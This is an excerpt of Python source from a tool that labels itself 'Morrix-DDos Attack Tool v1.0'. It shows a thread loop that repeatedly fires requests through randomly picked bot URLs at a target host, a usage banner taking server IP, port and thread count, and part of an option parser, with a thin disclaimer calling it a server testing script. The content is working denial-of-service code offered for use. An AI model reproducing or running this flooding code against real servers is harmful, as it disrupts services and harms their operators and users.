...
def dos2():
	while True:
		item=w.get()
		bot_morrix(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Morrix-DDos Attack Tool v1.0
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 morrix.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
...
def get_parameters():
	...
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Morrix")
